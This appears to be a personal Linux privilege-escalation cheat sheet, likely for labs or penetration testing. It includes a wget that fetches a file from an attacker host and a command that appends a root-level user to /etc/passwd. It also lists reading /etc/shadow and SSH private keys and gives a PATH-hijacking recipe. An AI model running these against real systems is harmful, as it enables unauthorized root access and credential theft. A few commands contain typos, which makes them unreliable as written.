# Linux Privilege Escalation

## Helpers

### Getting files to the target

#### Python HTTP server
```bash
# Attacker machine, in dir of file
python3 http.server PORT

# Target machine
wget ATTACKER_IP:PORT/FILE
```

## Thought process

### Credential Access
- Try reusing passwords on every account
- Search for passwords in config files or source code
    - `.htaccess`, SQL query, local database, bash history
- Try reusing SSH keys
- Does the current user have full `sudo` access?

### Exploits
- Which services are running on `localhost`?
- Kernel versions and exploits?
    ```bash
    # Get kernel version
    uname -r

    # Get all system ifnormation
    uname -a
    ```

### Misconfiguration

#### Cronjobs
- **Desc**: The cron daemon executes commands at a specific point in time. Either once or reocurring. The commands/jobs are specified in crontab files.
- Find active cronjobs `cat /etc/crontab`
- Format
    - `# m h dom mon dow user command`
        - `#`: ID
        - `m`: minute
        - `h`: hour
        - `dom`: day of month
        - `mon`: month
        - `dow`: day of week
        - `user`: What user the command will run as
        - `command`: Which command will be run 
- Are there cron jobs that are writable?
    - Is there a cronjob run by root that is writable?
- Is there a writable cron job dependency? (Files, Python script)
    - Is the directory writeable? (Renaming possible)
- Cron jobs are usually stored at /etc/cron.d 

#### SUID/SGID files
```bash
# List files that have SUID or SGID bits set
find / -perm -u=s -type f 2>/dev/null 
```
- Check [GTFOBins](https://gtfobins.org/)

#### Sensitive files writable
- `/etc/shadow`
- `/etc/passwd`
    - Create new user with known password, set `UID = 0` (root access)
        ```bash
        # Create password hash
        openssl passwd -1 -salt [salt] [password]
        openssl passwod -1 -salt new 123
            $1$new$p7ptkEKU1HnaHpRtzNizS1 
        # Add new root user to /etc/passwd
        echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
        ```
        ```bash
        # Example
        jan:x:1000:100:Jan Keuchel:/home/jan:/run/current-system/sw/bin/zsh

        # Format:
        # username : password : UID : GID : comment : home_dir : shell 
        # <password> is either the password hash or a 'x' if the actual
        # password is stored inside /etc/shadow 
        ```
- `/etc/sudoers`
    - Who is allowed to run `sudo` and which commands?
        ```bash
        # Get the commands the current user is allowed to run as sudo
        sudo -l
        ```
        - Check [GTFOBins](https://gtfobins.org/)
        - Check for Exclusion operators (!) [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

#### Sensitive files readable
- `/etc/shadow`
- `/root/.ssh/id_rsa`
- `/home/<user>/.ssh/id_rsa`

#### Writable `PATH`
- `PATH` is an environment variable that holds paths to executables. When executing commands, the executable is searched for in the given paths. The first match is used.
- Exploit concept:
    - Find an executable with SUID bit set.
    - Check if that executable makes calls to system functions such as ps, ls, cat, ...
    - If the PATH variable is mutable, modify it and place a poisoned ps/ls/cat file in there. When the original executable runs, it calls our new binary. 
        ```bash
        # modify PATH
        export PATH=/tmp:$PATH
        ```
- Allowed to write to the environment variable `PATH` of the root user? 
